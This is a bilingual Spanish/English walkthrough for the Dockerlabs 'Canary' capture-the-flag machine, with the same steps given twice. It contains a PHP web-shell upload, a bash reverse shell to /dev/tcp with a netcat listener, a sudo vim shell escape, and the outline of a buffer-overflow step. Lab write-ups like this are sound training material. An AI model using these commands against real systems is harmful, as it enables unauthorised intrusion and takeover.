# Guía de Inicio Rápido - Canary Dockerlabs

## Sección en Español

### Requisitos Previos
- Acceso a la máquina vulnerable (IP del objetivo)
- Herramientas instaladas: nmap, gobuster, python3, pwntools
- Entorno de depuración: GDB, Ghidra

### Pasos Críticos para Resolver el Laboratorio

#### 1. Reconocimiento Inicial (5-10 minutos)
```bash
# Escaneo de puertos
nmap -p- <IP_OBJETIVO>

# Enumeración de directorios
gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt
```

#### 2. Explotación de Upload de Archivos (5 minutos)
```bash
# Crear script PHP con shell reversa
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

# Subir archivo a través de la interfaz web
# Acceder a: http://<IP_OBJETIVO>/uploads/shell.phtml?cmd=id
```

#### 3. Obtención de Shell Inversa (3 minutos)
```bash
# En tu máquina atacante (listener)
nc -lvnp 4444

# En la shell web
cmd=bash -i >& /dev/tcp/<TU_IP>/4444 0>&1
```

#### 4. Escalada a usuario jerry (5 minutos)
```bash
# Con acceso como www-data
sudo -l

# Ejecutar vim como jerry
sudo -u jerry /usr/bin/vim -c ':! /bin/bash'

# Estabilizar shell TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### 5. Análisis del Binario suma (10 minutos)
```bash
# Verificar permisos sudo
sudo -l

# Transferir binario a máquina atacante
scp jerry@<IP>:/opt/suma ./suma

# Analizar con Ghidra
ghidra suma

# Buscar función set_flag
```

#### 6. Explotación de Buffer Overflow (15 minutos)
```bash
# Obtener dirección de set_flag
objdump -d suma | grep set_flag

# Crear script de exploit
python3 exploit.py

# Ejecutar exploit
python3 exploit.py GDB=0 REMOTE=0
```

#### 7. Obtención de Root (5 minutos)
```bash
# El script modifica flag.txt a ACTIVE
# Ejecutar command_exec.py como sudo
sudo python3 /opt/command_exec.py

# Abrir shell como root
/bin/bash
```

### Tiempo Total: ~45-60 minutos

---

## English Section

### Prerequisites
- Access to vulnerable machine (target IP)
- Installed tools: nmap, gobuster, python3, pwntools
- Debug environment: GDB, Ghidra

### Critical Steps to Solve the Laboratory

#### 1. Initial Reconnaissance (5-10 minutes)
```bash
# Port scanning
nmap -p- <TARGET_IP>

# Directory enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

#### 2. File Upload Exploitation (5 minutes)
```bash
# Create PHP script with reverse shell
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

# Upload file through web interface
# Access: http://<TARGET_IP>/uploads/shell.phtml?cmd=id
```

#### 3. Obtaining Reverse Shell (3 minutes)
```bash
# On your attacking machine (listener)
nc -lvnp 4444

# In web shell
cmd=bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

#### 4. Escalation to jerry User (5 minutes)
```bash
# With www-data access
sudo -l

# Execute vim as jerry
sudo -u jerry /usr/bin/vim -c ':! /bin/bash'

# Stabilize TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### 5. Analysis of suma Binary (10 minutes)
```bash
# Check sudo permissions
sudo -l

# Transfer binary to attacking machine
scp jerry@<IP>:/opt/suma ./suma

# Analyze with Ghidra
ghidra suma

# Search for set_flag function
```

#### 6. Buffer Overflow Exploitation (15 minutes)
```bash
# Get set_flag address
objdump -d suma | grep set_flag

# Create exploit script
python3 exploit.py

# Run exploit
python3 exploit.py GDB=0 REMOTE=0
```

#### 7. Obtaining Root (5 minutes)
```bash
# The script modifies flag.txt to ACTIVE
# Execute command_exec.py with sudo
sudo python3 /opt/command_exec.py

# Open shell as root
/bin/bash
```

### Total Time: ~45-60 minutes

---

## Conceptos Clave / Key Concepts

**ESP (Español)**:
- File Upload Bypass: Cambiar extensión de .php a .phtml
- Privilege Escalation: Explotar vim para ejecutar comandos como otro usuario
- Binary Analysis: Usar Ghidra para revelar funciones ocultas
- Memory Exploitation: Usar Format String para leer valores de canario

**ENG (English)**:
- File Upload Bypass: Change extension from .php to .phtml
- Privilege Escalation: Exploit vim to execute commands as another user
- Binary Analysis: Use Ghidra to reveal hidden functions
- Memory Exploitation: Use Format String to read canary values

---

## Tips Importantes / Important Tips

1. **Validación de Acceso / Access Validation**: Siempre verificar permisos con `sudo -l` / Always verify permissions with `sudo -l`
2. **Estabilización de Shell / Shell Stabilization**: Usar técnicas TTY para mejor interactividad / Use TTY techniques for better interactivity
3. **Transferencia de Archivos / File Transfer**: Usar servidores HTTP temporales / Use temporary HTTP servers
4. **Análisis Binario / Binary Analysis**: Ghidra es más poderoso que strings / Ghidra is more powerful than strings
5. **Fuzzing**: Automatizar búsqueda de offsets / Automate offset searching
